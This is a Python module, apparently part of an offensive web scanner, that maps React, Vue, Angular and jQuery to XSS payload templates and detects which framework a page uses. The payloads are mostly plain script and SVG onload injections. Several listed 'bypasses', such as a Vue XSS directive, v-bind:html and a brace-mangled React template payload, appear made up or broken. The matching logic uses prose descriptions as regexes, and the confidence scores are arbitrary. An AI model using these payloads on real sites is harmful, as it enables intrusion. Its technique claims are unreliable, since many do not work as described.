"""
Framework-specific sink exploitation module.
Provides XSS bypass techniques for popular JavaScript frameworks.
"""

import re
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass
from enum import Enum


class Framework(Enum):
    """JavaScript frameworks."""
    REACT = "react"
    VUE = "vue"
    ANGULAR = "angular"
    JQUERY = "jquery"
    SVELTE = "svelte"
    SOLID = "solid"
    ASTRO = "astro"
    NEXTJS = "nextjs"
    REMIX = "remix"


@dataclass
class FrameworkBypass:
    """Framework-specific XSS bypass technique."""
    framework: Framework
    technique: str
    payload_template: str
    description: str
    condition: str
    confidence: float


class FrameworkSinkExploiter:
    """
    Framework-specific sink exploitation detector.
    Detects and tests XSS bypasses for popular JavaScript frameworks.
    """

    # React bypasses
    REACT_BYPASSES = [
        FrameworkBypass(
            framework=Framework.REACT,
            technique="dangerouslySetInnerHTML",
            payload_template="<script>{m}</script>",
            description="React dangerouslySetInnerHTML bypass",
            condition="dangerouslySetInnerHTML usage",
            confidence=0.9
        ),
        FrameworkBypass(
            framework=Framework.REACT,
            technique="svg_onload",
            payload_template="<svg/onload={m}>",
            description="React SVG XSS via svgOnload",
            condition="React rendering SVG",
            confidence=0.8
        ),
        FrameworkBypass(
            framework=Framework.REACT,
            technique="template_literal",
            payload_template="{{{{constructor.prototype.constructor({m})()}}}}}",
            description="React template literal bypass",
            condition="React < 18 (template strings before sanitization)",
            confidence=0.7
        ),
    ]

    # Vue bypasses
    VUE_BYPASSES = [
        FrameworkBypass(
            framework=Framework.VUE,
            technique="v-html",
            payload_template="<script>{m}</script>",
            description="Vue v-html bypass",
            condition="v-html directive usage",
            confidence=0.9
        ),
        FrameworkBypass(
            framework=Framework.VUE,
            technique="v-bind_html",
            payload_template="<script>{m}</script>",
            description="Vue v-bind:html bypass",
            condition="v-bind:html directive usage",
            confidence=0.8
        ),
        FrameworkBypass(
            framework=Framework.VUE,
            technique="xss",
            payload_template="<script>{m}</script>",
            description="Vue XSS directive bypass",
            condition="XSS directive usage",
            confidence=0.9
        ),
    ]

    # Angular bypasses
    ANGULAR_BYPASSES = [
        FrameworkBypass(
            framework=Framework.ANGULAR,
            technique="bypassSecurityTrustHtml",
            payload_template="<script>{m}</script>",
            description="Angular bypassSecurityTrustHtml bypass",
            condition="Angular bypassSecurityTrustHtml usage",
            confidence=0.9
        ),
        FrameworkBypass(
            framework=Framework.ANGULAR,
            technique="sanitize-html",
            payload_template="<script>{m}</script>",
            description="Angular sanitize-html bypass",
            condition="Angular sanitizeHtml usage",
            confidence=0.8
        ),
        FrameworkBypass(
            framework=Framework.ANGULAR,
            technique="ng-bind-html",
            payload_template="<script>{m}</script>",
            description="Angular ng-bind-html bypass",
            condition="ng-bind-html directive usage",
            confidence=0.7
        ),
    ]

    # jQuery bypasses
    JQUERY_BYPASSES = [
        FrameworkBypass(
            framework=Framework.JQUERY,
            technique="html",
            payload_template="<script>{m}</script>",
            description="jQuery .html() bypass",
            condition="jQuery .html() usage",
            confidence=0.9
        ),
        FrameworkBypass(
            framework=Framework.JQUERY,
            technique="append",
            payload_template="<script>{m}</script>",
            description="jQuery .append() bypass",
            condition="jQuery .append() usage",
            confidence=0.9
        ),
        FrameworkBypass(
            framework=Framework.JQUERY,
            technique="parseHTML",
            payload_template="<script>{m}</script>",
            description="jQuery parseHTML bypass",
            condition="jQuery parseHTML usage",
            confidence=0.8
        ),
    ]

    def __init__(self):
        self._bypasses = {
            Framework.REACT: self.REACT_BYPASSES,
            Framework.VUE: self.VUE_BYPASSES,
            Framework.ANGULAR: self.ANGULAR_BYPASSES,
            Framework.JQUERY: self.JQUERY_BYPASSES,
        }

    def detect_framework(self, js_content: str) -> Optional[Framework]:
        """Detect which framework is being used."""
        framework_indicators = {
            Framework.REACT: r"React|ReactDOM|jsx|createClass|useState|useEffect|useRef",
            Framework.VUE: r"Vue\.|vue\.mount|v-if|v-for|v-html|v-bind",
            Framework.ANGULAR: r"angular\.|ng-controller|ng-bind|ng-href|ng-model",
            Framework.JQUERY: r"\$\(|jQuery\.fn",
            Framework.SVELTE: r"svelte|create_svelte_component",
            Framework.SOLID: r"SolidJS|createSignal",
            Framework.ASTRO: r"Astro|Astro\.fetchContent",
            Framework.NEXTJS: r"getServerSideProps|next/config",
            Framework.REMIX: r"remix:react-router|useLoaderData",
        }

        for framework, pattern in framework_indicators.items():
            if re.search(pattern, js_content, re.IGNORECASE):
                return framework
        return None

    def get_bypasses(self, framework: Framework) -> List[FrameworkBypass]:
        """Get XSS bypasses for a specific framework."""
        return self._bypasses.get(framework, [])

    def generate_bypass_payloads(
        self,
        framework: Framework,
        marker: str
    ) -> List[str]:
        """Generate XSS bypass payloads for a framework."""
        bypasses = self.get_bypasses(framework)
        payloads = []

        for bypass in bypasses:
            payload = bypass.payload_template.replace("{m}", marker)
            payloads.append(payload)

        return payloads

    def test_bypass_in_page(
        self,
        framework: Framework,
        html_content: str,
        marker: str
    ) -> List[FrameworkBypass]:
        """
        Test if framework bypasses are present in the page.

        Args:
            framework: Framework to test
            html_content: HTML content of the page
            marker: Unique marker for verification

        Returns:
            List of bypasses that may work based on detection
        """
        active_bypasses = []

        for bypass in self.get_bypasses(framework):
            # Check if the bypass condition is met
            if re.search(bypass.condition, html_content, re.IGNORECASE):
                active_bypasses.append(bypass)

        return active_bypasses

    def get_confidence_score(self, framework: Framework) -> float:
        """Get overall confidence score for framework XSS detection."""
        bypasses = self.get_bypasses(framework)
        if not bypasses:
            return 0.0

        total_confidence = sum(b.confidence for b in bypasses)
        return round(total_confidence / len(bypasses), 2)
